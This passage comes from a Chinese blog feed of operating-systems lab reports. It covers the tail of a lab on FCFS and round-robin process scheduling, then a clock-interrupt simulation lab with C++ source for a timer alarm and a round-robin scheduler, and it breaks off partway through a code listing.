class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112213852527.png" alt="image-20211112213852527"></p><p><strong>考虑阻塞：</strong></p><p>初值（小时间片）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112213737120.png" alt="image-20211112213737120"></p><p><strong>时间片很大（等同于FCFS）</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">60</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/image-20211112213941550.png" alt="image-20211112213941550"></p><h3 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h3><blockquote><p>根据上面的观察结果，比较这两种算法各自的优缺点，根据结果再和其他的算法比较。</p></blockquote><p><strong>FCFS 调度</strong>的代码编写简单且容易理解。但是， 采用FCFS 策略的平均等待时间通常较长。</p><p>RR算法的性能很大程度上依赖于时间片的大小。在极端情况下，如果时间片非常大，那么RR算法与FCFS算法一样，如果时间片很小(如1ms)，那么R算法称为处理器共享。</p><p>而<strong>SJF 调度算法</strong>可证明为最佳的， 这是因为对于给定的一组进程， SJF 算法的平均等待时间最小。</p><p><strong>优先级调度算法</strong>可以自行选择进程优先级来调度，但是其一个主要问题是<strong>无穷阻塞</strong>（indefinite blocking）或饥饿（ starvation）。可以运行但缺乏CPU 的进程可认为是阻塞的，它在等待CPU。优先级调度算法会使某个低优先级进程无穷等待CPU。</p><p><strong>多级反馈队列调度算法</strong>允许进程在队列之间移动。主要思想是根据不同CPU区间的特点以区分进程。如果进程使用过多CPU时间， 那么它会被转移到更低优先级队列。这种方案将I/O约束和交互进程留在更高优先级队列。此外， 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列。这种形式的老化阻止饥饿的发生。</p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>这次实验主要实现了FCFS进程调度算法和RR进程调度算法，本实验设计了两版代码，最开始设计FCFS时，想的较为简单，将全部进程都排序加入了队列，然后依次出队列即完成了调度，这思路导致了我之后设计RR算法时也采用了这种策略，但这样使得一旦有一个进程被中断后要加入包含全部进程的队列，需要和队列里的所有进程比较到达时间，而我最开始采取的解决方法是全部出队，排序后再次入队，虽然这样是可以的，但是却不符合模拟的初衷。</p><p>后来在仔细看流程图后，发现自己第一版的代码里没有设计阻塞进程的函数，而且原来的设计很难加进去这个功能，所以干脆重新写了一版RR调度算法的代码。按照实际调度时的情况，我建立了就绪队列、阻塞队列、当前运行进程三个队列，首先将全部进程加入阻塞队列（未到到达时间的进程默认为阻塞）,然后根据时间加入就绪队列，当前进程为空时，从就绪队列取元素。同时设计了一个随机阻塞函数 ，来完成进程的阻塞，被阻塞进程再次加入阻塞队列。</p><p>而之后我又根据这一版的RR调度算法更改了FCFS的代码，只需要去掉RR轮转部分的代码就可以变成FCFS了，这与RR算法在时间片无限长时等价于FCFS算法的规律也是相同的（关于这个结果上方的运行结果中也有比较），虽然FCFS代码比第一版复杂了很多，但结构和逻辑上更为完善了。</p><p>从这两个实验，让我更加理解了FCFS和轮转法调度的规则，对于进程在调度时就绪队列阻塞队列等的变化也有了更深刻的理解。在实验编写过程中，也遇到许多错误，但后来总结起来看，很多都是没有弄清楚进程入队出队的关系导致的，理清楚就绪和运行队列的具体关系后，按次序将进程加入队列，再执行，逐个判断进程结束的条件，弄清楚这些，代码也就顺利完成了。</p><p>总的来说，这次实验收获也很大。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验三-中断处理</title>
    <link href="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/"/>
    <url>/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统第三次实验中断处理"><a href="#操作系统第三次实验中断处理" class="headerlink" title="操作系统第三次实验中断处理"></a>操作系统第三次实验中断处理</h1><h1 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h1><h2 id="一、实验内容"><a href="#一、实验内容" class="headerlink" title="一、实验内容"></a>一、实验内容</h2><ul><li>运用某种高级语言（如C或C++）模拟时钟中断的产生及设计一个对时钟中断事件进行处理的模拟程序。</li></ul><h2 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h2><ul><li>现代计算机系统的硬件部分都设有中断机构，中断机构能发现中断事件，且当发现中断事件后迫使正在处理器上执行的进程暂时停止执行，而让操作系统的中断处理程序占有处理器去处理出现的中断事件。</li><li>本实验模拟“时钟中断事件”的处理，对其它中断事件的模拟处理，可根据各中断事件的性质确定处理原则，制定算法，自行设计。</li><li>通过本实验了解中断及中断处理程序的作用。</li></ul><h2 id="三、实验题目"><a href="#三、实验题目" class="headerlink" title="三、实验题目"></a>三、实验题目</h2><ol><li>计算机系统工作过程中，若出现中断事件，硬件就把它记录在中断寄存器中。中断寄存器的每一位可与一个中断事件对应，当出现某中断事件后，对应的中断寄存器的某一位就被置成“1”。</li></ol><ul><li>处理器每执行一条指令后，必须查中断寄存器，当中断寄存器内容不为“0”时，说明有中断事件发生。硬件把中断寄存器内容以及现行程序的断点存在主存的固定单元。操作系统分析保存在主存固定单元中的中断寄存器内容就可知道出现的中断事件的性质，从而作出相应的处理。</li><li>本实验中，用从键盘读入信息来模拟中断寄存器的作用，用计数器加1来模拟处理器执行了一条指令。每模拟一条指令执行后，从键盘读入信息且分析，当读入信息=0时，表示无中断事件发生，继续执行指令；当读入信息=1时，表示发生了时钟中断事件，转时钟中断处理程序。</li></ul><ol start="2"><li>假定计算机系统有一时钟，它按电源频率（50Hz）产生中断请求信号，即每隔20毫秒产生一次中断请求信号，称时钟中断信号，时钟中断的间隔时间（20毫秒）称时钟单位。</li></ol><ul><li>按自己确定的频率在键盘上键入“0”或“1”来模拟按电源频率产生的时钟中断信号。</li></ul><ol start="3"><li>中断处理程序应首先保护被中断的现行进程的现场（通用寄存器内容、断点等），现场信息可保存在进程控制块中；然后处理出现的中断事件，根据处理结果修改被中断进程的状态；最后转向处理器调度，由处理器调度选择可运行的进程，恢复现场使其运行。</li></ol><ul><li>本实验主要模拟中断事件的处理，为简单起见可省去保护现场和处理器调度的工作。</li></ul><ol start="4"><li>为模拟时钟中断的处理，先分析一下时钟中断的作用。利用时钟中断可计算日历时钟，也可作定时闹钟等。</li></ol><ul><li>计算日历时钟——把开机时的时间存放在指定的称为“日历时钟”的工作单元中，用一计时器累计时钟中断次数。根据时钟中断的次数和时钟单位（20毫秒）以及开机时的日历时钟可计算出当前的精确的日历时钟。</li><li>定时闹钟——对需要定时的场合，可把轮到运行的进程的时间片值送到称为“定时闹钟”的工作单元中，每产生一次时钟中断就把定时闹钟值减1，当该值为“0”时，表示确定的时间已到，起到定时的作用。</li></ul><ol start="5"><li><p>本实验的模拟程序可由两部分组成，一部分是模拟硬件产生时钟中断，另一部分模拟操作系统的时钟中断处理程序。模拟程序的算法如图1-1。其中，保护现场和处理器调度的工作在编程序时可省去。约定处理器调度总是选择<br> 被中断进程继续执行。</p></li><li><p>按模拟算法设计程序，要求显示或打印开机时间、定时闹钟初值、定时闹钟为“0”时的日历时钟。确定三个不同的定时闹钟初值，运行设计的程序，观察得到的结果。</p></li></ol><p>  <img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112104249163.png" alt="image-20211112104249163"></p><p>  <strong>思考题</strong></p><p>  将进程调度策略结合到本实验中，可选用时间片轮转的调度策略。给每个进程分配一个相同的时间片，每产生一次时钟中断经处理后，被中断进程时间片减1，时间片值¹0时，该进程优先运行，若时间片值=0且该进程尚未运行结束，则将它排入队尾，再给它分配一个时间片，直到所有的进程运行结束。应怎样设计进程控制块？各进程的状态怎样变化？在本实验的程序中加入处理器调度程序</p><h2 id="四、实验设计与过程"><a href="#四、实验设计与过程" class="headerlink" title="四、实验设计与过程"></a>四、实验设计与过程</h2><h3 id="1-时钟中断事件模拟程序"><a href="#1-时钟中断事件模拟程序" class="headerlink" title="1. 时钟中断事件模拟程序"></a>1. 时钟中断事件模拟程序</h3><h4 id="数据结构和符号说明"><a href="#数据结构和符号说明" class="headerlink" title="数据结构和符号说明"></a><strong>数据结构</strong>和符号说明</h4><p>因为该实验中断结束后继续调用上一个进程，直到进程结束，所以未设计进程结构体；</p><p>符号说明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//定时时钟</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br></code></pre></td></tr></table></figure><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><blockquote><p>该程序思路很清晰，设置一个定时时钟，然后进行中断判断，当输入为1时，中断进程，定时闹钟减一，输入为0时，继续执行进程。</p></blockquote><blockquote><p>当时钟为0时，程序结束，计算时间后输出当前时间。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//定时时钟</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br><br><span class="hljs-built_in">time</span>(&amp;t); <span class="hljs-comment">//获取系统时间</span><br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<span class="hljs-comment">//将time值分解为tm结构</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间：&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<span class="hljs-comment">//以字符串形式输出时间</span><br>cout &lt;&lt; <span class="hljs-string">&quot;定时闹钟的设定值为：&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>) <span class="hljs-comment">//当未到定时时钟设定值时</span><br>&#123;<br><span class="hljs-keyword">if</span> (ir != <span class="hljs-number">0</span>)<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;一条指令正在执行&quot;</span> &lt;&lt; endl;<br>counter++;<br>cout &lt;&lt; <span class="hljs-string">&quot;是否有中断产生，1是，0否：&quot;</span>; <span class="hljs-comment">//每输入一次频率设置为1s</span><br>cin &gt;&gt; ir;<br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无中断，指令继续执行&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl <span class="hljs-comment">//保护现场具体过程省略</span><br> &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>timer++;   <span class="hljs-comment">//计时器加1</span><br>clock_alarm--; <span class="hljs-comment">//定时闹钟减1</span><br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>; <span class="hljs-comment">//计算当前时间</span><br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="程序初值和运行结果"><a href="#程序初值和运行结果" class="headerlink" title="程序初值和运行结果"></a>程序初值和运行结果</h4><p>定时闹钟clock_alarm=5</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112110700237.png" alt="image-20211112110700237"></p><p>定时闹钟clock_alarm=3</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112110831917.png" alt="image-20211112110831917"></p><p>定时闹钟clock_alarm=6</p><p><img src="/2021/11/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86/image-20211112111022197.png" alt="image-20211112111022197"></p><h3 id="2-思考题：时钟中断程序加调度"><a href="#2-思考题：时钟中断程序加调度" class="headerlink" title="2. 思考题：时钟中断程序加调度"></a>2. 思考题：时钟中断程序加调度</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PCB</span> //进程结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> time_slice; <span class="hljs-comment">//时间片</span><br><span class="hljs-keyword">int</span> time_remain; <span class="hljs-comment">//进程剩余运行时间</span><br><span class="hljs-keyword">int</span> id; <span class="hljs-comment">//进程id</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="符号说明"><a href="#符号说明" class="headerlink" title="符号说明"></a>符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">queue&lt;PCB&gt; p; <span class="hljs-comment">//进程的就绪队列</span><br>PCB process;<span class="hljs-comment">//当前进程</span><br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br></code></pre></td></tr></table></figure><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="时间计算函数"><a href="#时间计算函数" class="headerlink" title="时间计算函数"></a>时间计算函数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">time_caculate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> timer)</span> <span class="hljs-comment">//计算当前时间</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;现在时间是：&quot;</span> &lt;&lt; endl;<br>cc-&gt;tm_hour += timer / <span class="hljs-number">3600</span>;<br>timer %= <span class="hljs-number">3600</span>;<br>cc-&gt;tm_min += timer / <span class="hljs-number">60</span>;<br>timer %= <span class="hljs-number">60</span>;<br>cc-&gt;tm_sec += timer;<br>cout &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进程初始化函数"><a href="#进程初始化函数" class="headerlink" title="进程初始化函数"></a>进程初始化函数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">(queue&lt;PCB&gt; &amp;p)</span> <span class="hljs-comment">//进程初始化，给定一些进程的初值</span></span><br><span class="hljs-function"></span>&#123;<br>PCB ex[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>ex[i].id = i + <span class="hljs-number">1</span>;<br>ex[i].time_slice = <span class="hljs-number">2</span>;<br>ex[i].time_remain = <span class="hljs-number">2</span> + i;<br>p.<span class="hljs-built_in">push</span>(ex[i]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进程保存函数"><a href="#进程保存函数" class="headerlink" title="进程保存函数"></a>进程保存函数</h5><blockquote><p>保存进程的时间片信息，具体其他信息的保存省略</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_save</span><span class="hljs-params">()</span> <span class="hljs-comment">//中断发生时的进程保存</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在保护现场···&quot;</span> &lt;&lt; endl;<br>process.time_remain--; <span class="hljs-comment">//每产生一次时钟中断经处理后，被中断进程时间减1</span><br>process.time_slice--;  <span class="hljs-comment">//时间片也减1</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;现场保护完成&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进程调度函数"><a href="#进程调度函数" class="headerlink" title="进程调度函数"></a>进程调度函数</h5><blockquote><p>分为三种情况</p><p>第一种为进程运行时间已完成</p><p>第二种为进程时间片用完</p><p>这两种都需要切换进程</p><p>第三种则是时间片和进程剩余时间均不为零，继续运行当前进程</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ir, <span class="hljs-keyword">int</span> timer)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (process.time_remain == <span class="hljs-number">0</span>)<br>ir = <span class="hljs-number">1</span>; <span class="hljs-comment">//标记进程已结束或中断，需要切换进程</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (process.time_slice == <span class="hljs-number">0</span>)<br>&#123;<br>ir = <span class="hljs-number">1</span>;<span class="hljs-comment">//当前进程已结束或中断，需要切换进程</span><br>process.time_slice = <span class="hljs-number">2</span>; <span class="hljs-comment">//恢复时间片</span><br>p.<span class="hljs-built_in">push</span>(process);<span class="hljs-comment">//再次放入就绪队列</span><br>&#125;<br><span class="hljs-keyword">else</span><br>ir = <span class="hljs-number">-1</span>; <span class="hljs-comment">//当前进程继续运行</span><br><span class="hljs-keyword">if</span> (ir == <span class="hljs-number">1</span>)<br>&#123;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>process = p.<span class="hljs-built_in">front</span>();<br><span class="hljs-keyword">if</span> (!p.<span class="hljs-built_in">empty</span>())<br>p.<span class="hljs-built_in">pop</span>();<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;所以进程已经执行完成,时间过去了&quot;</span> &lt;&lt; timer &lt;&lt; <span class="hljs-string">&quot;s&quot;</span> &lt;&lt; endl;<br><span class="hljs-built_in">time_caculate</span>(timer); <span class="hljs-comment">//进程队列为空则结束，计算时间</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//返回0表示结束程序</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ir == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;---------------------------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 